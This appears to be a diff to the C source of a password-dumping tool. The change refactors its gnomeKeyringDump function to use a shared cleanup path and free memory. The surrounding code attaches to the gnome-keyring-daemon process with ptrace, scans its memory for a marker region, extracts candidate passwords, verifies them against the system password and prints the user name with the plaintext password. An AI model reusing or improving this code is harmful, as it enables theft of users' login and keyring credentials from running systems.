@@ -84,6 +84,7 @@ int gnomeKeyringDump(int pid)
     int eggCur = 0, passGood = 0;
     char *sysVersion = NULL;
     void *eggPtr = NULL;
+    int ret = -1;
 
     if ( (user = getUser(pid)) == NULL )
     {
@@ -91,14 +92,17 @@ int gnomeKeyringDump(int pid)
     }
 
     if ( !strcmp(user, "lightdm") )
-        return 1; // Skip this one to avoid crash
+    {
+        ret = 1; // Skip this one to avoid crash
+        goto CLEANUP;
+    }
 
     
     printf("[+] GNOME KEYRING (%d)\n", pid);
     if ( (target = getGnomeKeyringTarget()) == NULL )
     {
         printf("  [-] gnome-keyring-daemon version not supported\n");
-        return 1;
+        goto CLEANUP;
     }
 
     eggPtr = target->eggPtrAddr;
@@ -106,7 +110,7 @@ int gnomeKeyringDump(int pid)
     if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
     {
         printf("  [!] ERROR: Ptrace attach failed - %s\n", strerror(errno));
-        return -1;
+        goto CLEANUP;
     }
 
     wait(&status);
@@ -117,7 +121,7 @@ int gnomeKeyringDump(int pid)
             if ( (base = getBaseAddr(pid)) == 0 )
             {
                 printf("  [!] ERROR: Failed to get image base ofr %d\n", pid);
-                return -1;
+                goto CLEANUP;
             }
             eggPtr += base;
         }
@@ -125,7 +129,7 @@ int gnomeKeyringDump(int pid)
         if ( (eggAddr = ptrace(PTRACE_PEEKDATA, pid, (void*)eggPtr, NULL)) < 0 )
         {
             printf(" [!] ERROR: Ptrace peek 1 failed - %s\n", strerror(errno));
-            return -1;
+            goto CLEANUP;
         }
 
         while (1)
@@ -133,14 +137,14 @@ int gnomeKeyringDump(int pid)
             if (loopNum == 4) // loopMax = 4
             {
                 printf("  [!] ERROR: Cannot find marker for egg region\n");
-                return -1;
+                goto CLEANUP;
             }
 
             marker = 0;
             if ( (marker = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
             {
                 printf("  [!] ERROR: Ptrace peek marker failed - %s\n", strerror(errno));
-                return -1;
+                goto CLEANUP;
             }
             if ( ((marker & 0xff) != 0xaa) && ((marker & 0xff) != 0x00) )
             {
@@ -157,7 +161,8 @@ int gnomeKeyringDump(int pid)
             if ( (loopNum == ((MAX_PASSWD-1) / sizeof(long))) || (secretsChecked == 10) )
             {
                 printf("  [!] ERROR: Cannot find password\n");
-                return 1;
+                ret = 1;
+                goto CLEANUP;
             }
             chunk = 0;
             eggAddr += eggCur;
@@ -165,7 +170,7 @@ int gnomeKeyringDump(int pid)
             if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
             {
                 printf("  [!] ERROR: Ptrace peek 2 failed - %s\n", strerror(errno));
-                return -1;
+                goto CLEANUP;
             }
 
             memcpy(passwd+passwdCur, &chunk, sizeof(long));
@@ -177,7 +182,7 @@ int gnomeKeyringDump(int pid)
                     if ( (passGood = checkPasswd(user, passwd)) < 0 )
                     {
                         printf("  [!] ERROR: Could not check passwd\n");
-                        return -1;
+                        goto CLEANUP;
                     }
                     if ( passGood == 1)
                     {
@@ -199,18 +204,19 @@ int gnomeKeyringDump(int pid)
         if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
         {
             printf(" [!] ERROR: Ptrace attach failed\n");
-            return -1;
+            goto CLEANUP;
         }
     }
 
     if (passwd)
     {
         printf("  [-] %s:%s\n", user, passwd);
-        return 0;
+        ret = 0;
     }
-    else
-    {
-        return -1;
-    }
+
+    CLEANUP:
+        if ( user != NULL )
+            free(user);
+        return ret; 
 }
 
